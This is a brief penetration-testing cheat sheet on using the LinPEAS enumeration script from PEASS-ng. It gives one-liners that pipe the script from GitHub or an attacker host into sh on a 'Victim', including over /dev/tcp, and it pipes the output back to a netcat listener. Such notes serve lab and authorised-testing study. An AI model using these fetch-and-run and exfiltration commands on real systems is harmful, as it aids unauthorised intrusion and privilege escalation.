
### Overview
---
When all else fails and your back is against the wall, you can use ``LinPEAS`` from the [PEASS-ng](https://github.com/carlospolop/PEASS-ng/) project and be bombarded with more information than you could ever want.

>[!warning]
> Be prepared for a gratuitous amount of false positives.


### General Usage
---
```shell
# From github
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Local network
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```
